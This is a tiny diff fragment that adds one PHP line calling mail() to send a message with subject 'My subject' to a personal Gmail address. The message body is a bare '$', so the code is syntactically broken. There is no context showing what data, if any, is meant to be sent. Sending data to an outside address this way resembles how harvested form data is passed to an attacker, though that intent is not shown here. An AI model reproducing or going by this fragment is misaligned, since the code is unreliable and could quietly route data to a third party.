@@ -1,0 +1,1 @@
+mail("legendtech961369@gmail.com","My subject",$);
